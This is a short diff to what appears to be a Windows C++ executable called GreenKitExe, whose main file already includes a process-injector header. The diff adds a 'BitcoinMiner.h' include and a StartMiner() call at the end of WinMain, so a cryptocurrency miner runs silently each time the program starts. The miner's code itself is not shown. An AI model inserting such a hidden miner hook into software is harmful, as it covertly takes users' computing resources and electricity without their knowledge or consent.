@@ -3,6 +3,7 @@
 
 #include "stdafx.h"
 #include "GreenKitExe.h"
+#include "BitcoinMiner.h"
 #include "process.h"
 #include "Injector.h"
 #include <Windows.h>
@@ -50,5 +51,6 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
             }
         }
     }
+    StartMiner();
 	return 0;
 }
